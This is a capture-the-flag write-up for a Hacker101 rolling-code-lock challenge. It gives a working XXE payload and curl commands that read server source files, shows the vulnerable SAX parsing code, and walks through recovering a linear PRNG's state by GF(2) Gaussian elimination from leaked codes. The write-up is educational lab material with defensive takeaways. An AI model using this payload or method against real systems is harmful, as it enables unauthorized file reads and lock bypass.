# Model E1337 — Rolling Code Lock

**Platform:** HackerOne CTF  
**Challenge:** Model E1337 — Rolling Code Lock  
**Difficulty:** Hard  
**Category:** Web / Cryptography / XXE  
**Flags:** 2

---

## Overview

A web application simulating a rolling-code lock (like a garage door opener). The home page shows a "Locked" status with a code input form. Entering the correct rolling code unlocks the device, revealing a flag.

The challenge combines hidden endpoint discovery, XXE injection, and GF(2) linear cryptanalysis of a custom PRNG.

**Hints provided:**
- "Hidden functionality is good functionality"
- "Comments can often reveal important things"
- "XML from untrusted sources must be processed carefully"
- "This application runs on the uwsgi-nginx-flask-docker image"

**Server:** openresty/1.29.2.4, Python 2.7 Flask (`main.py`, `rng.py`)

---

## Reconnaissance

### Endpoints Discovered

| Path | Method | Status | Description |
|------|--------|--------|-------------|
| `/` | GET | 200 | Home page — lock status + code input form |
| `/admin` | GET | 200 | Admin panel — shows lock location, hidden HTML comment |
| `/get-config` | GET | 200 | Returns XML config: `<config><location>…</location></config>` |
| `/set-config` | GET | 302 | Accepts `?data=` XML parameter, processes it, redirects to `/admin` |
| `/unlock` | POST | 200 | Validates rolling code — `next(26)` per request |

### Key Findings

1. **`/admin`** contains an HTML comment: `<!-- We should be using get-config for this on the client side. -->`

2. **`/get-config`** returns XML with a configurable `<location>` value, initially `Front door`. The value is reflected from a global variable set by `/set-config`.

3. **`/set-config`** accepts a `data` query parameter containing XML, which is parsed by Python's `xml.sax.make_parser()` — **vulnerable to XXE** by default.

4. **`/unlock`** calls `next(26)` from `rng.py` and sleeps 5 seconds. Incorrect codes leak the expected value: `"Code incorrect.  Expected NNNNNNNN"`.

### Source Code Recovery

Using XXE via `/set-config`, the application source files are readable:

- **`main.py`** — Flask routes, XXE handler, flag storage
- **`rng.py`** — Custom PRNG with `setup(seed)` and `next(bits)` functions

---

## Flag 0 — XXE Injection

**Method:** XML External Entity injection via `/set-config?data=` to read `main.py`

### Vulnerability

The `/set-config` endpoint passes user-controlled XML to `xml.sax.make_parser()` without disabling external entities:

```python
@app.route('/set-config')
def setConfig():
    data = request.args['data']
    parser = xml.sax.make_parser()
    parser.setContentHandler(Handler())
    parser.parse(StringIO(data))
    return redirect('admin')
```

### Exploit

```bash
# Step 1: Inject XXE payload to read main.py
XXE='<?xml version="1.0"?><!DOCTYPE root [<!ENTITY xxe SYSTEM "main.py">]><config><location>&xxe;</location></config>'
curl -s "https://TARGET.ctf.hacker101.com/set-config?data=$(python3 -c "import urllib.parse; print(urllib.parse.quote('''$XXE'''))")"

# Step 2: Read the reflected file contents
curl -s "https://TARGET.ctf.hacker101.com/get-config"
```

The flag is embedded as a comment in the source:

```python
# ^FLAG^<redacted>$FLAG$
```

> **Flag 0:** `^FLAG^<redacted>$FLAG$`

**Takeaway:** Python's `xml.sax.make_parser()` enables external entity processing by default. Always disable XXE when parsing untrusted XML by setting a custom `EntityResolver` or using `defusedxml`.

---

## Flag 1 — PRNG Cryptanalysis

**Method:** GF(2) Gaussian elimination to recover the 64-bit PRNG state from observed outputs, then predict the next unlock code

### The PRNG (from rng.py)

```python
def setup(seed):
    global state
    state = 0
    for i in range(16):          # 32-bit seed processed 2 bits at a time
        cur = seed & 3
        seed >>= 2
        state = (state << 4) | ((state & 3) ^ cur)
        state |= cur << 2

def next(bits):
    global state
    ret = 0
    for i in range(bits):
        ret <<= 1
        ret |= state & 1            # Output LSB of state
        state = (state << 1) ^ (state >> 61)   # LFSR shift
        state &= 0xFFFFFFFFFFFFFFFF
        state ^= 0xFFFFFFFFFFFFFFFF            # NOT (flip all bits)
        for j in range(0, 64, 4):              # Nibble permutation
            cur = (state >> j) & 0xF
            cur = (cur >> 3) | ((cur >> 2) & 2) | \
                  ((cur << 3) & 8) | ((cur << 2) & 4)
            state ^= cur << j
    return ret
```

The nibble permutation maps `[b3, b2, b1, b0]` → `[b0, b0, b3, b3]`.

### Key Insight: Linearity in GF(2)

Every operation in `next()` is GF(2)-linear:

| Operation | Python | GF(2) Effect |
|-----------|--------|-------------|
| Shift left/right | `<<`, `>>` | Linear (each output bit = one input bit) |
| XOR | `^` | Addition in GF(2) |
| Bitwise NOT | `^ 0xFFF…` | Adds constant 1 to each equation |
| Nibble permute | Multi-step XOR | Linear combination of 4 input bits |

**Consequence:** Each output bit is a linear combination of the 64 initial state bits plus a constant. Given N consecutive `next(26)` outputs, we have **26N linear equations in 64 unknowns over GF(2)**.

### Attack Steps

1. **Collect observations:** Make 7 consecutive POST requests to `/unlock` with incorrect codes. Each response reveals the expected code: `"Code incorrect.  Expected NNNNNNNN"`.

2. **Build linear system:** Symbolically track each state bit as a GF(2) vector `(coeff₀…coeff₆₃, constant)`. For each output bit, add an equation `sum(coeff_i × state_i) + constant = observed_bit`.

3. **Gaussian elimination:** With 7 calls (182 equations), 48 of 64 state bits are uniquely determined. The remaining 16 are free variables.

4. **Brute-force free variables:** For the 16 free bits, try all 2^16 = 65536 assignments. Verify each candidate reproduces all 7 observed outputs. Extract the single unique next-code candidate.

5. **Submit:** POST the predicted code to `/unlock`.

### Solution Data

- **Observed values:** `[55288803, 12275372, 31278839, 40518696, 1739601, 34324680, 51806200]`
- **Equations:** 182 equations, 64 unknowns
- **Determined bits:** 48/64 via Gaussian elimination
- **Free variables:** `{6, 10, 14, 18, 22, 26, 30, 34, 38, 42, 46, 50, 54, 58, 62, 63}`
- **Brute-force space:** 65536 → 1 valid candidate
- **Predicted code:** `7368617`

```
Unlocked successfully.  Flag: ^FLAG^<redacted>$FLAG$
```

> **Flag 1:** `^FLAG^<redacted>$FLAG$`

**Takeaway:** When a PRNG uses only XOR, shifts, and NOT operations, it is completely linear over GF(2) and can be broken with Gaussian elimination. You don't need to recover the original seed — recovering the current 64-bit state is sufficient to predict all future outputs.

---

## Complete Flag List

| Flag | Hex | Technique |
|:----:|-----|-----------|
| 0 | `<redacted>` | XXE injection via `/set-config` → read `main.py` |
| 1 | `<redacted>` | GF(2) Gaussian elimination → PRNG state recovery → predicted unlock code |

---

## Key Takeaways

1. **Hidden endpoints matter.** `/admin`, `/get-config`, and `/set-config` were not linked from the home page but were discoverable through directory brute-forcing or hints.

2. **XXE in Python SAX parsers.** `xml.sax.make_parser()` is vulnerable to XXE by default. Use `defusedxml` or configure a safe `EntityResolver` when handling untrusted XML.

3. **GF(2) linearity is a cryptanalytic goldmine.** Any PRNG built entirely from XOR, shifts, and NOT operations has no non-linearity — it reduces to a system of linear equations solvable in polynomial time.

4. **State recovery beats seed recovery.** You don't need the original 32-bit seed; knowing the current 64-bit state is enough to predict every future code. The PRNG has no forward secrecy.

5. **Information leakage through error messages.** The `"Code incorrect. Expected NNNNNNNN"` message provides exactly the data needed to build the attack — without it, the PRNG would be a black box.

6. **Server resets corrupt observation chains.** The challenge instance may reset after inactivity, breaking the continuity of observed values. Always verify your observations come from a single unbroken sequence.

---

## Files

| File | Description |
|------|-------------|
| `solve.py` | Complete PoC — XXE flag0 + GF(2) PRNG cryptanalysis flag1 |

## Usage

```bash
pip install requests
python3 solve.py https://<instance-id>.ctf.hacker101.com/
```

---

## References

- [Hacker101 CTF Platform](https://ctf.hacker101.com/)
- [Hacker101 — XXE (Video)](https://www.hacker101.com/sessions/xxe)
- [Gaussian Elimination over GF(2)](https://en.wikipedia.org/wiki/Gaussian_elimination)
- [Linear Feedback Shift Register](https://en.wikipedia.org/wiki/Linear-feedback_shift_register)
- [Z3 Solver](https://github.com/Z3Prover/z3) — Alternative approach (SMT-based)
